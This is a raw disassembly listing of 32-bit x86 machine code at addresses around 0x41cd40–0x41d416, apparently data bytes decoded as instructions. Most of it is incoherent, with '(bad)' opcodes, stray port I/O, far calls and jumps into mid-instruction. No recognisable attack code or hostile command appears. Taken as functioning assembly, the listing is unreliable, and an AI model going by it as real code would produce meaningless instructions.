  41cd40:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cd41:	aas    
  41cd42:	xchg   DWORD PTR [ebx],ebx
  41cd44:	fcmove st,st(1)
  41cd46:	rcr    DWORD PTR [edi+0x5a],1
  41cd49:	push   ebx
  41cd4a:	fsub   QWORD PTR [edi]
  41cd4c:	and    ah,al
  41cd4e:	pop    es
  41cd4f:	sahf   
  41cd50:	shl    DWORD PTR ds:0x310815da,0xb9
  41cd57:	inc    ebx
  41cd58:	popf   
  41cd59:	dec    ebp
  41cd5a:	xchg   edi,eax
  41cd5b:	out    0xfe,eax
  41cd5d:	xor    BYTE PTR [esi],ah
  41cd5f:	mov    bl,0x6f
  41cd61:	xchg   ebx,edx
  41cd63:	test   eax,0x1ca91749
  41cd68:	push   es
  41cd69:	cmc    
  41cd6a:	jl     0x41cd02
  41cd6c:	mov    edi,DWORD PTR [eax-0x23802dc5]
  41cd72:	push   ds
  41cd73:	or     cl,BYTE PTR [ebp+0x2f]
  41cd76:	and    esp,DWORD PTR [ebp+0x46ff48cd]
  41cd7c:	push   eax
  41cd7d:	adc    ah,dl
  41cd7f:	aaa    
  41cd80:	popa   
  41cd81:	mov    ebx,0x41c6e2c3
  41cd86:	mov    bl,0x36
	...
  41cd94:	push   edx
  41cd95:	xor    al,0x40
  41cd97:	gs data16 jne 0x41ce12
  41cd9b:	aaa    
  41cd9c:	push   0x7e6a4e09
  41cda1:	push   ecx
  41cda2:	mov    esp,0x189b7c0
  41cda7:	add    BYTE PTR [eax+eax*1+0x2dbc0000],ch
  41cdae:	push   edx
  41cdaf:	pop    eax
  41cdb0:	popa   
  41cdb1:	push   ecx
  41cdb2:	repnz cmp edi,DWORD PTR [ebp+0x14]
  41cdb6:	push   cs
  41cdb7:	cld    
  41cdb8:	mov    ah,0xa
  41cdba:	std    
  41cdbb:	add    ecx,DWORD PTR [esi-0x5b]
  41cdbe:	bound  esi,QWORD PTR [edx-0x3f]
  41cdc1:	stc    
  41cdc2:	js     0x41cd77
  41cdc4:	sar    BYTE PTR [esi],cl
  41cdc6:	fcom   DWORD PTR [ecx-0x6faa8179]
  41cdcc:	or     eax,0x1e86ef0c
  41cdd1:	scas   al,BYTE PTR es:[edi]
  41cdd2:	outs   dx,BYTE PTR ds:[esi]
  41cdd3:	push   ss
  41cdd4:	ds adc cl,bl
  41cdd7:	mov    al,ds:0x62883904
  41cddc:	aaa    
  41cddd:	push   ecx
  41cdde:	and    dl,BYTE PTR [eax+0x3f14661e]
  41cde4:	pop    eax
  41cde5:	in     eax,dx
  41cde6:	mov    ebx,0x5df30075
  41cdeb:	cld    
  41cdec:	or     eax,DWORD PTR [eax+0x3c5763cb]
  41cdf2:	fbld   TBYTE PTR [ecx]
  41cdf4:	xchg   edx,eax
  41cdf5:	std    
  41cdf6:	adc    eax,0x3a4cbb1d
  41cdfb:	cwde   
  41cdfc:	das    
  41cdfd:	jno    0x41ce10
  41cdff:	xor    al,0xf9
  41ce01:	js     0x41ce2b
  41ce03:	pop    es
  41ce04:	adc    eax,0xbad4cb52
  41ce09:	sbb    bh,cl
  41ce0b:	(bad)  
  41ce0c:	call   0xdf0b:0xf1c3f26b
  41ce13:	je     0x41cdb9
  41ce15:	fld    QWORD PTR [ecx+ecx*4]
  41ce18:	cs ffreep st(2)
  41ce1b:	mov    edi,0xcc7be8de
  41ce20:	hlt    
  41ce21:	iret   
  41ce22:	ret    0x77dc
  41ce25:	pop    ecx
  41ce26:	xchg   edi,eax
  41ce27:	mov    ch,0x1f
  41ce29:	call   0x2e8ad1a5
  41ce2e:	std    
  41ce2f:	mov    dh,0xc8
  41ce31:	push   cs
  41ce32:	rcr    al,1
  41ce34:	dec    esi
  41ce35:	int    0x78
  41ce37:	(bad)  
  41ce39:	pop    eax
  41ce3a:	jp     0x41ce07
  41ce3c:	add    BYTE PTR [eax-0x3a],bh
  41ce3f:	stc    
  41ce40:	shl    DWORD PTR [ecx+0x21],0x2e
  41ce44:	pop    edi
  41ce45:	cmp    ah,0xed
  41ce48:	adc    eax,0x56d3d7d2
  41ce4d:	retf   
  41ce4e:	sbb    al,0xdd
  41ce50:	scas   eax,DWORD PTR es:[edi]
  41ce51:	sbb    DWORD PTR [ebx+0x29],edx
  41ce54:	jns    0x41ce06
  41ce56:	cmp    eax,0xc4
	...
  41ce63:	add    BYTE PTR [edx],dl
  41ce65:	mov    edx,0xe6f8c6d8
  41ce6a:	push   ds
  41ce6b:	(bad)  
  41ce6c:	adc    bl,dh
  41ce6e:	cwde   
  41ce6f:	out    dx,al
  41ce70:	pop    ecx
  41ce71:	cld    
  41ce72:	pop    esp
  41ce73:	and    esp,DWORD PTR [ebx-0x53fffe56]
  41ce79:	add    BYTE PTR [eax],al
  41ce7b:	add    cl,ah
  41ce7d:	xor    al,ah
  41ce7f:	rol    BYTE PTR [eax+edx*2+0x450e6e6f],cl
  41ce86:	adc    ebx,esp
  41ce88:	xchg   edx,eax
  41ce89:	inc    edx
  41ce8a:	dec    ebp
  41ce8b:	xchg   esi,eax
  41ce8c:	adc    DWORD PTR [esi+0x7c],eax
  41ce8f:	outs   dx,DWORD PTR ds:[esi]
  41ce90:	add    ch,BYTE PTR ds:0xf4b54c48
  41ce96:	fnstsw WORD PTR [eax+0x4719aa0f]
  41ce9c:	mov    edx,0xfebc84dc
  41cea1:	mov    ah,BYTE PTR [ebp+0x28]
  41cea4:	lods   eax,DWORD PTR ds:[esi]
  41cea5:	ins    BYTE PTR es:[edi],dx
  41cea6:	cmp    DWORD PTR [edi-0x31],ecx
  41cea9:	ficom  DWORD PTR [eax]
  41ceab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ceac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cead:	int3   
  41ceae:	push   ss
  41ceaf:	dec    esp
  41ceb0:	pop    ds
  41ceb1:	pop    es
  41ceb2:	jnp    0x41cebd
  41ceb4:	dec    esp
  41ceb5:	sti    
  41ceb6:	sbb    DWORD PTR [eax-0x96b1356],ebp
  41cebc:	xor    ebx,ebp
  41cebe:	sbb    cl,ah
  41cec0:	or     BYTE PTR [esi],dh
  41cec2:	xchg   esi,eax
  41cec3:	push   ds
  41cec4:	addr16 xchg ebx,eax
  41cec6:	jp     0x41ce49
  41cec8:	data16 cmp BYTE PTR [ebp+0x2b],0xc0
  41cecd:	dec    ecx
  41cece:	add    BYTE PTR [ecx+0x5],cl
  41ced1:	push   es
  41ced2:	mov    WORD PTR es:[ecx-0x47],fs
  41ced6:	jp     0x41ce63
  41ced8:	rol    BYTE PTR [eax+0x5d],cl
  41cedb:	bound  edx,QWORD PTR [edi+0x72917f5f]
  41cee1:	into   
  41cee2:	add    DWORD PTR [ebp+0x34001213],esi
  41cee8:	or     eax,0x53e26ea8
  41ceed:	mov    cl,0xe
  41ceef:	pop    ebp
  41cef0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cef1:	(bad)  
  41cef3:	adc    ch,BYTE PTR [edx-0x2f]
  41cef6:	pop    edx
  41cef7:	popf   
  41cef8:	data16 fldcw WORD PTR [edx+0x5]
  41cefc:	pop    edx
  41cefd:	gs pop ebp
  41ceff:	jb     0x41ceac
  41cf01:	cmp    DWORD PTR [ecx+0x769ecc78],eax
  41cf07:	pusha  
  41cf08:	or     DWORD PTR [esi-0x3b480fb4],ebp
  41cf0e:	or     bl,dl
  41cf10:	div    BYTE PTR [edx-0x4dbc492e]
  41cf16:	add    ebp,DWORD PTR [edi+ebp*1+0x4d]
  41cf1a:	mov    DWORD PTR [eax-0x2d53025b],esi
  41cf20:	lds    edx,FWORD PTR [edx+ebp*4]
  41cf23:	cmp    eax,DWORD PTR [edi+0x2a5778]
	...
  41cf31:	add    BYTE PTR [eax],al
  41cf33:	add    BYTE PTR [ecx+0x46],cl
  41cf36:	sub    BYTE PTR [eax],dh
  41cf38:	das    
  41cf39:	jle    0x41cf94
  41cf3b:	jg     0x41cf03
  41cf3d:	imul   esi,eax,0xffffffd5
  41cf40:	xchg   DWORD PTR [ebx],eax
  41cf42:	test   al,0x56
  41cf44:	dec    edi
  41cf45:	stos   DWORD PTR es:[edi],eax
  41cf46:	add    DWORD PTR [eax],eax
  41cf48:	lods   al,BYTE PTR ds:[esi]
  41cf49:	add    BYTE PTR [eax],al
  41cf4b:	add    BYTE PTR [ebx+ebx*8+0x68],al
  41cf4f:	(bad)  
  41cf50:	sbb    DWORD PTR [edi],esp
  41cf52:	add    BYTE PTR [ecx],al
  41cf54:	ins    DWORD PTR es:[edi],dx
  41cf55:	in     eax,dx
  41cf56:	ins    BYTE PTR es:[edi],dx
  41cf57:	les    eax,FWORD PTR [esi+0xc]
  41cf5a:	sub    BYTE PTR [edx],cl
  41cf5c:	rcr    DWORD PTR [ecx],cl
  41cf5e:	nop
  41cf5f:	xchg   eax,esi
  41cf61:	mov    BYTE PTR [esi-0x33],ch
  41cf64:	fsubr  DWORD PTR [esi-0x328db9a9]
  41cf6a:	inc    edx
  41cf6b:	fcmovnu st,st(5)
  41cf6d:	mov    al,0xc6
  41cf6f:	add    eax,0xbee9c367
  41cf74:	or     ah,dl
  41cf76:	xor    al,0x2
  41cf78:	and    eax,0x19f40a58
  41cf7d:	imul   edi,DWORD PTR [edi-0x36ac5907],0x99dc6838
  41cf87:	(bad)  
  41cf88:	mov    ecx,0xcaa9d735
  41cf8d:	dec    edx
  41cf8e:	inc    ecx
  41cf8f:	dec    edx
  41cf90:	pop    esp
  41cf91:	and    al,0x7e
  41cf93:	icebp  
  41cf94:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cf95:	jmp    0x2ffa3100
  41cf9a:	dec    ebp
  41cf9b:	inc    ebp
  41cf9c:	and    esi,eax
  41cf9e:	pushf  
  41cf9f:	(bad)  
  41cfa0:	mov    al,0x5b
  41cfa2:	cli    
  41cfa3:	arpl   di,cx
  41cfa5:	pusha  
  41cfa6:	xchg   ecx,eax
  41cfa7:	pop    ds
  41cfa8:	mov    al,0xf8
  41cfaa:	and    ebp,ecx
  41cfac:	pop    ebx
  41cfad:	and    ebp,0xffffffb9
  41cfb0:	inc    esp
  41cfb1:	sbb    DWORD PTR [ebx-0x3d],esp
  41cfb4:	push   esi
  41cfb5:	dec    eax
  41cfb6:	into   
  41cfb7:	adc    DWORD PTR [eax-0x6e],0x47
  41cfbb:	aam    0xe0
  41cfbd:	and    BYTE PTR [esi],ah
  41cfbf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cfc0:	sbb    al,0xd4
  41cfc2:	xor    DWORD PTR [edi+eax*4],esp
  41cfc5:	outs   dx,DWORD PTR ds:[esi]
  41cfc6:	sub    al,0x5f
  41cfc8:	mov    BYTE PTR [esi-0x4bf896fd],bh
  41cfce:	(bad)  
  41cfcf:	adc    al,0xd0
  41cfd1:	inc    edx
  41cfd2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cfd3:	sub    esp,ebp
  41cfd5:	xor    al,0x70
  41cfd7:	hlt    
  41cfd8:	in     eax,0xe6
  41cfda:	rol    BYTE PTR [ebx],0x54
  41cfdd:	icebp  
  41cfde:	mov    ds:0x4e3b55a2,al
  41cfe3:	leave  
  41cfe4:	test   DWORD PTR [ebp-0x6f],ebx
  41cfe7:	(bad)  
  41cfe8:	sub    edi,DWORD PTR [esi]
  41cfea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cfeb:	sub    eax,0xf6514725
  41cff0:	jnp    0x41d015
  41cff2:	fst    DWORD PTR [ecx]
  41cff4:	xchg   ecx,eax
  41cff5:	xchg   edx,eax
  41cff6:	xchg   esi,eax
  41cff7:	sahf   
	...
  41d004:	addr16 (bad) 
  41d006:	and    dh,dh
  41d008:	mov    eax,ds:0xe7d7f7f6
  41d00d:	mov    eax,0xed58da72
  41d012:	pop    edx
  41d013:	loop   0x41d010
  41d015:	stos   DWORD PTR es:[edi],eax
  41d016:	add    DWORD PTR [eax],eax
  41d018:	lods   al,BYTE PTR ds:[esi]
  41d019:	add    BYTE PTR [eax],al
  41d01b:	add    BYTE PTR [esi+0xcc3124d],dh
  41d021:	std    
  41d022:	ins    BYTE PTR es:[edi],dx
  41d023:	mov    cl,0x3
  41d025:	call   0x7b65b875
  41d02a:	dec    esi
  41d02b:	sub    al,0x80
  41d02d:	je     0x41d05e
  41d02f:	and    ch,BYTE PTR [ebx+0x7fbd32d1]
  41d035:	and    edi,esp
  41d037:	ins    DWORD PTR es:[edi],dx
  41d038:	icebp  
  41d039:	cmp    esp,DWORD PTR [ebp+0x36]
  41d03c:	out    dx,al
  41d03d:	shl    BYTE PTR [edx],cl
  41d03f:	jae    0x41cff8
  41d041:	cld    
  41d042:	dec    DWORD PTR [ebx+0x7a81624f]
  41d048:	inc    edx
  41d049:	sub    ebp,DWORD PTR [edi-0x65]
  41d04c:	cmp    al,0xb0
  41d04e:	jno    0x41d02b
  41d050:	sub    DWORD PTR [ecx+edi*1+0xe],ecx
  41d054:	sar    edx,1
  41d056:	cs jb  0x41d01a
  41d059:	add    ah,dh
  41d05b:	addr16 jno 0x41d0cb
  41d05e:	bound  edx,QWORD PTR ds:0xe2f4f13
  41d064:	cld    
  41d065:	scas   eax,DWORD PTR es:[edi]
  41d066:	cmp    al,0x7b
  41d068:	les    ebp,FWORD PTR [ebx]
  41d06a:	adc    DWORD PTR [ebx+0x16af7d4f],esp
  41d070:	daa    
  41d071:	lock (bad) 
  41d073:	es loope 0x41d0ce
  41d076:	or     al,0x9f
  41d078:	xor    ebp,DWORD PTR [ecx]
  41d07a:	add    ah,BYTE PTR [ecx+eiz*8+0x17]
  41d07e:	xor    al,0xd3
  41d080:	cld    
  41d081:	out    dx,eax
  41d082:	test   eax,0xa190846a
  41d087:	(bad)  
  41d088:	gs loope 0x41d0a4
  41d08b:	pop    ebx
  41d08c:	mov    ecx,0x1e13ad56
  41d091:	adc    DWORD PTR [esi+esi*1],eax
  41d094:	out    dx,eax
  41d095:	fs cmp BYTE PTR gs:[edi+ecx*4-0x72],ch
  41d09b:	sbb    bh,al
  41d09d:	pushf  
  41d09e:	fst    DWORD PTR [edi+0x2c]
  41d0a1:	xchg   ecx,eax
  41d0a2:	(bad)  
  41d0a3:	jo     0x41d08a
  41d0a5:	jmp    0x41d0a0
  41d0a7:	enter  0xbb2,0x51
  41d0ab:	popa   
  41d0ac:	icebp  
  41d0ad:	xchg   edx,eax
  41d0ae:	jl     0x41d077
  41d0b0:	mov    ebp,0x4ac8208
  41d0b5:	mov    bl,0x34
  41d0b7:	or     DWORD PTR [ebp+0x420cceea],ebx
  41d0bd:	push   ebx
  41d0be:	lock adc al,bh
  41d0c1:	add    eax,0xabb3afb0
  41d0c6:	cmp    eax,0xd0
	...
  41d0d3:	add    bl,al
  41d0d5:	or     eax,0xefee66a6
  41d0da:	ret    
  41d0db:	lods   eax,DWORD PTR ds:[esi]
  41d0dc:	sub    al,0xb8
  41d0de:	mov    ds:0xd37f8047,eax
  41d0e3:	stc    
  41d0e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d0e5:	lods   al,BYTE PTR ds:[esi]
  41d0e6:	add    DWORD PTR [eax],eax
  41d0e8:	lods   al,BYTE PTR ds:[esi]
  41d0e9:	add    BYTE PTR [eax],al
  41d0eb:	add    BYTE PTR [ebp+0x6a],ah
  41d0ee:	retf   
  41d0ef:	bnd jle 0x41d121
  41d0f2:	(bad)  
  41d0f3:	pop    sp
  41d0f5:	push   0xffffff99
  41d0f7:	das    
  41d0f8:	aad    0x12
  41d0fa:	adc    eax,esi
  41d0fc:	mul    dl
  41d0fe:	sti    
  41d0ff:	bound  edx,QWORD PTR [eax+edi*8-0x3b]
  41d103:	and    al,0x55
  41d105:	(bad)  
  41d106:	xor    edi,DWORD PTR [ecx-0x57919ded]
  41d10c:	sub    DWORD PTR [edi+0x74],ebx
  41d10f:	mov    edi,0xbe4e4297
  41d114:	scas   eax,DWORD PTR es:[edi]
  41d115:	mov    ds:0x4a7d10fd,al
  41d11a:	sbb    DWORD PTR [edx+0x5e],esp
  41d11d:	dec    edx
  41d11e:	hlt    
  41d11f:	outs   dx,BYTE PTR ds:[esi]
  41d120:	sar    BYTE PTR [edx+0x60d7e6e7],0x34
  41d127:	jp     0x41d0ed
  41d129:	pop    edx
  41d12a:	mov    edx,ebp
  41d12c:	test   DWORD PTR [eax],edx
  41d12e:	adc    esp,edi
  41d130:	int    0xcb
  41d132:	call   0x6964:0x472dd59d
  41d139:	cmp    al,0x30
  41d13b:	imul   ebx,DWORD PTR [esi],0x9d7c2d9e
  41d141:	mov    eax,0x3205de75
  41d146:	loope  0x41d0ff
  41d148:	sbb    dl,dh
  41d14a:	jae    0x41d0d6
  41d14c:	sbb    edx,DWORD PTR [esi+ebp*2+0x2]
  41d150:	add    bl,BYTE PTR ds:0xa71cd4e2
  41d156:	dec    edi
  41d157:	arpl   WORD PTR [edx-0x3],bx
  41d15a:	pop    esi
  41d15b:	push   ebx
  41d15c:	test   DWORD PTR [eax+0x568288b5],0xd4781368
  41d166:	mov    ds:0xd4061bf6,eax
  41d16b:	push   ebp
  41d16c:	jns    0x41d1a6
  41d16e:	and    edx,ecx
  41d170:	or     DWORD PTR [ecx-0x231b685a],ebp
  41d176:	sub    eax,0xda94073f
  41d17b:	add    DWORD PTR [ecx+0x1a85eb03],ebp
  41d181:	mov    eax,ds:0xae84832f
  41d186:	addr16 pop ds
  41d188:	pusha  
  41d189:	and    edi,DWORD PTR [esi+0x4d82c88a]
  41d18f:	aam    0x92
  41d191:	fistp  DWORD PTR [ebx+0x163167dc]
  41d197:	cwde   
	...
  41d1a4:	fld    st(2)
  41d1a6:	add    eax,0xddcf1f49
  41d1ab:	ror    al,cl
  41d1ad:	outs   dx,DWORD PTR ds:[esi]
  41d1ae:	clc    
  41d1af:	rcl    BYTE PTR [esi],cl
  41d1b1:	add    al,0xd7
  41d1b3:	xchg   edx,eax
  41d1b4:	push   ebx
  41d1b5:	lods   eax,DWORD PTR ds:[esi]
  41d1b6:	add    DWORD PTR [eax],eax
  41d1b8:	xchg   edx,eax
  41d1b9:	add    BYTE PTR [eax],al
  41d1bb:	add    BYTE PTR [esi+0x3d],ch
  41d1be:	fs leave 
  41d1c0:	jns    0x41d14d
  41d1c2:	mov    eax,0xdd20e85c
  41d1c7:	mov    ebx,0x66cf34bc
  41d1cc:	xchg   esp,eax
  41d1cd:	pop    edi
  41d1ce:	jbe    0x41d1cb
  41d1d0:	outs   dx,BYTE PTR ds:[esi]
  41d1d1:	lahf   
  41d1d2:	in     eax,dx
  41d1d3:	sbb    ecx,DWORD PTR [edx]
  41d1d5:	jl     0x41d19c
  41d1d7:	mov    ds:0x3bbae2f5,eax
  41d1dc:	dec    ebp
  41d1dd:	sub    ebx,esi
  41d1df:	pop    es
  41d1e0:	xlat   BYTE PTR ds:[ebx]
  41d1e1:	xlat   BYTE PTR ds:[ebx]
  41d1e2:	out    dx,al
  41d1e3:	xchg   eax,ebx
  41d1e5:	dec    ebx
  41d1e6:	sbb    bh,bh
  41d1e8:	jnp    0x41d255
  41d1ea:	dec    ecx
  41d1eb:	test   BYTE PTR [edi+edi*8+0x509fcc3d],ch
  41d1f2:	int    0x5d
  41d1f4:	pop    es
  41d1f5:	scas   al,BYTE PTR es:[edi]
  41d1f6:	ffree  st(4)
  41d1f8:	mov    ch,BYTE PTR [ecx+0x254cd0bf]
  41d1fe:	sub    cl,bl
  41d200:	sar    DWORD PTR [edi],cl
  41d202:	leave  
  41d203:	cdq    
  41d204:	imul   edi,DWORD PTR [ebx],0xffffffdf
  41d207:	xchg   DWORD PTR [ecx+0x5150cb35],esp
  41d20d:	cli    
  41d20e:	and    DWORD PTR [edx],0xffffffb8
  41d211:	lahf   
  41d212:	inc    ebx
  41d213:	out    0x9b,al
  41d215:	mov    eax,0xcf4a1e0b
  41d21a:	ss std 
  41d21c:	sbb    edi,ebx
  41d21e:	outs   dx,DWORD PTR ds:[esi]
  41d21f:	aas    
  41d220:	imul   DWORD PTR gs:[edx+eiz*1-0x468c019a]
  41d228:	dec    esi
  41d229:	push   edi
  41d22a:	lods   eax,DWORD PTR ds:[esi]
  41d22b:	gs jae 0x41d272
  41d22e:	add    dh,BYTE PTR [edi]
  41d230:	arpl   WORD PTR [edx+0x30],bx
  41d233:	add    esp,eax
  41d235:	cmp    esp,DWORD PTR [ebp+0x23]
  41d238:	pop    ebp
  41d239:	adc    DWORD PTR [edi-0x18],esp
  41d23c:	inc    eax
  41d23d:	dec    esp
  41d23e:	jne    0x41d1ed
  41d240:	xchg   ecx,eax
  41d241:	jb     0x41d287
  41d243:	mov    ecx,0x87f5286f
  41d248:	sbb    al,0x2b
  41d24a:	in     eax,dx
  41d24b:	pop    ebx
  41d24c:	call   0x41d251
  41d251:	add    BYTE PTR [eax],al
  41d253:	add    BYTE PTR [eax],al
  41d255:	pusha  
  41d256:	inc    edx
  41d257:	add    BYTE PTR [eax+eiz*2],al
  41d25a:	inc    edx
  41d25b:	add    BYTE PTR [eax],cl
  41d25d:	pusha  
  41d25e:	inc    edx
  41d25f:	add    BYTE PTR [eax+eiz*2],cl
  41d262:	inc    edx
  41d263:	add    BYTE PTR [eax],dl
  41d265:	pusha  
  41d266:	inc    edx
  41d267:	add    BYTE PTR [eax+eiz*2],dl
  41d26a:	inc    edx
  41d26b:	add    BYTE PTR [eax],bl
  41d26d:	pusha  
  41d26e:	inc    edx
  41d26f:	add    BYTE PTR [eax+eiz*2],bl
  41d272:	inc    edx
  41d273:	add    BYTE PTR [eax],al
  41d275:	jo     0x41d2b9
  41d277:	add    BYTE PTR [eax+esi*2],al
  41d27a:	inc    edx
  41d27b:	add    BYTE PTR [eax],cl
  41d27d:	jo     0x41d2c1
  41d27f:	add    BYTE PTR [eax+esi*2],cl
  41d282:	inc    edx
  41d283:	add    BYTE PTR [eax],dl
  41d285:	jo     0x41d2c9
  41d287:	add    BYTE PTR [eax+esi*2],dl
  41d28a:	inc    edx
  41d28b:	add    BYTE PTR [eax],bl
  41d28d:	jo     0x41d2d1
  41d28f:	add    BYTE PTR [eax+esi*2],bl
  41d292:	inc    edx
  41d293:	add    BYTE PTR [eax],al
  41d295:	add    BYTE PTR [edx+0x0],0x4
  41d299:	add    BYTE PTR [edx+0x0],0x8
  41d29d:	add    BYTE PTR [edx+0x0],0xc
  41d2a1:	add    BYTE PTR [edx+0x0],0x10
  41d2a5:	add    BYTE PTR [edx+0x0],0x14
  41d2a9:	add    BYTE PTR [edx+0x0],0x18
  41d2ad:	add    BYTE PTR [edx+0x0],0x1c
  41d2b1:	add    BYTE PTR [edx+0x0],0x78
  41d2b5:	data16 ins BYTE PTR es:[edi],dx
  41d2b7:	jp     0x41d310
  41d2b9:	jbe    0x41d302
  41d2bb:	ja     0x41d300
  41d2bd:	js     0x41d307
  41d2bf:	jno    0x41d311
  41d2c1:	arpl   WORD PTR [ebx+0x6f],dx
  41d2c4:	inc    edi
  41d2c5:	dec    esi
  41d2c6:	outs   dx,DWORD PTR ds:[esi]
  41d2c7:	pop    ecx
  41d2c8:	inc    edi
  41d2c9:	jb     0x41d312
  41d2cb:	jns    0x41d343
  41d2cd:	inc    ecx
  41d2ce:	pop    eax
  41d2cf:	dec    esp
  41d2d0:	add    BYTE PTR [eax],al
  41d2d2:	add    BYTE PTR [eax],al
  41d2d4:	pop    esp
  41d2d5:	(bad)  
  41d2d6:	inc    ecx
  41d2d7:	add    BYTE PTR [esi+edx*8+0x41],ah
  41d2db:	add    BYTE PTR [edx*8+0xbef0041],bl
  41d2e2:	mov    dl,0xe
  41d2e4:	jns    0x41d334
  41d2e6:	xor    BYTE PTR [esi-0x79],cl
  41d2e9:	dec    edi
  41d2ea:	cmp    eax,0x3e4faf4e
  41d2ef:	dec    esi
  41d2f0:	js     0x41d340
  41d2f2:	cmp    ecx,DWORD PTR [esi-0x64]
  41d2f5:	dec    edi
  41d2f6:	inc    esp
  41d2f7:	dec    esi
  41d2f8:	jae    0x41d348
  41d2fa:	inc    ecx
  41d2fb:	dec    esi
  41d2fc:	xor    BYTE PTR [esi+0x40],cl
  41d2ff:	dec    esi
  41d300:	pop    esp
  41d301:	pop    ebp
  41d302:	pop    edi
  41d303:	push   edx
  41d304:	cmp    DWORD PTR [esi+0x79],ecx
  41d307:	dec    esi
  41d308:	xor    BYTE PTR [esi-0x79],cl
  41d30b:	dec    edi
  41d30c:	cmp    eax,0x3e4faf4e
  41d311:	dec    esi
  41d312:	js     0x41d362
  41d314:	cmp    ecx,DWORD PTR [esi-0x64]
  41d317:	dec    edi
  41d318:	inc    esp
  41d319:	dec    esi
  41d31a:	mov    DWORD PTR [edi+0x41],ecx
  41d31d:	dec    esi
  41d31e:	xor    BYTE PTR [esi+0x40],cl
  41d321:	dec    esi
  41d322:	pop    esp
  41d323:	ins    DWORD PTR es:[edi],dx
  41d324:	pop    edi
  41d325:	bound  edi,QWORD PTR [ecx]
  41d327:	dec    esi
  41d328:	jns    0x41d378
  41d32a:	xor    BYTE PTR [esi-0x80],cl
  41d32d:	dec    edi
  41d32e:	cmp    eax,0x394e734e
  41d333:	dec    esi
  41d334:	mov    ds:0x304e3a4f,al
  41d339:	dec    esi
  41d33a:	inc    esi
  41d33b:	dec    esi
  41d33c:	pop    esp
  41d33d:	jge    0x41d39e
  41d33f:	jb     0x41d3b0
  41d341:	sub    BYTE PTR [esi-0x7d],0x7e
  41d345:	xchg   ebx,eax
  41d346:	jns    0x41d2d8
  41d348:	aas    
  41d349:	dec    esi
  41d34a:	test   BYTE PTR [edi+0x30],cl
  41d34d:	dec    esi
  41d34e:	test   BYTE PTR [edi+0x3c],cl
  41d351:	dec    esi
  41d352:	mov    ds:0x734e394f,al
  41d357:	dec    esi
  41d358:	inc    ebp
  41d359:	dec    esi
  41d35a:	xor    BYTE PTR [esi+0x44],cl
  41d35d:	dec    esi
  41d35e:	pop    esp
  41d35f:	lea    ebx,[edi-0x7e]
  41d362:	outs   dx,DWORD PTR ds:[esi]
  41d363:	xchg   edx,eax
  41d364:	outs   dx,BYTE PTR ds:[esi]
  41d365:	xchg   ebx,eax
  41d366:	jle    0x41d30b
  41d368:	jns    0x41d30a
  41d36a:	aas    
  41d36b:	dec    esi
  41d36c:	test   BYTE PTR [edi+0x30],cl
  41d36f:	dec    esi
  41d370:	test   BYTE PTR [edi+0x3c],cl
  41d373:	dec    esi
  41d374:	mov    ds:0x894e394f,al
  41d379:	dec    edi
  41d37a:	inc    ebp
  41d37b:	dec    esi
  41d37c:	xor    BYTE PTR [esi+0x44],cl
  41d37f:	dec    esi
  41d380:	pop    esp
  41d381:	popf   
  41d382:	pop    edi
  41d383:	xchg   edx,eax
  41d384:	outs   dx,DWORD PTR ds:[esi]
  41d385:	mov    ds:0xb37ea36e,al
  41d38a:	jns    0x41d33c
  41d38c:	aas    
  41d38d:	dec    esi
  41d38e:	mov    cs,WORD PTR [edi+0x30]
  41d391:	dec    esi
  41d392:	lods   al,BYTE PTR ds:[esi]
  41d393:	dec    edi
  41d394:	cmp    eax,0x394e734e
  41d399:	dec    esi
  41d39a:	mov    eax,ds:0x304e3a4f
  41d39f:	dec    esi
  41d3a0:	inc    esp
  41d3a1:	dec    esi
  41d3a2:	pop    esp
  41d3a3:	lods   eax,DWORD PTR ds:[esi]
  41d3a4:	pop    edi
  41d3a5:	mov    ds:0xb36eb26f,al
  41d3aa:	jle    0x41d36f
  41d3ac:	jns    0x41d36e
  41d3ae:	aas    
  41d3af:	dec    esi
  41d3b0:	mov    cs,WORD PTR [edi+0x30]
  41d3b3:	dec    esi
  41d3b4:	lods   al,BYTE PTR ds:[esi]
  41d3b5:	dec    edi
  41d3b6:	cmp    eax,0x394e7e4e
  41d3bb:	dec    esi
  41d3bc:	lahf   
  41d3bd:	dec    edi
  41d3be:	cmp    ecx,DWORD PTR [esi+0x30]
  41d3c1:	dec    esi
  41d3c2:	inc    ebp
  41d3c3:	dec    esi
  41d3c4:	pop    esp
  41d3c5:	mov    ebp,0xc26fb25f
  41d3ca:	outs   dx,BYTE PTR ds:[esi]
  41d3cb:	ret    
  41d3cc:	jle    0x41d3a1
  41d3ce:	jns    0x41d3a0
  41d3d0:	aas    
  41d3d1:	dec    esi
  41d3d2:	mov    cs,WORD PTR [edi+0x30]
  41d3d5:	dec    esi
  41d3d6:	lods   al,BYTE PTR ds:[esi]
  41d3d7:	dec    edi
  41d3d8:	cmp    eax,0x394f804e
  41d3dd:	dec    esi
  41d3de:	lods   al,BYTE PTR ds:[esi]
  41d3df:	dec    edi
  41d3e0:	cmp    cl,BYTE PTR [esi+0x30]
  41d3e3:	dec    esi
  41d3e4:	inc    esi
  41d3e5:	dec    esi
  41d3e6:	pop    esp
  41d3e7:	int    0x5f
  41d3e9:	ret    0xd26f
  41d3ec:	outs   dx,BYTE PTR ds:[esi]
  41d3ed:	sar    DWORD PTR [esi-0x1d],cl
  41d3f0:	jns    0x41d3d2
  41d3f2:	aas    
  41d3f3:	dec    esi
  41d3f4:	mov    cs,WORD PTR [edi+0x30]
  41d3f7:	dec    esi
  41d3f8:	lods   al,BYTE PTR ds:[esi]
  41d3f9:	dec    edi
  41d3fa:	cmp    eax,0x394f834e
  41d3ff:	dec    esi
  41d400:	mov    ds:0x304e3a4f,al
  41d405:	dec    esi
  41d406:	inc    esp
  41d407:	dec    esi
  41d408:	pop    esp
  41d409:	fstp   QWORD PTR [edi-0x2e]
  41d40c:	outs   dx,DWORD PTR ds:[esi]
  41d40d:	loop   0x41d47d
  41d40f:	jecxz  0x41d48f
  41d411:	repz jns 0x41d404
  41d414:	aas    
  41d415:	dec    esi
  41d416:	lea    ecx,[edi+0x30]
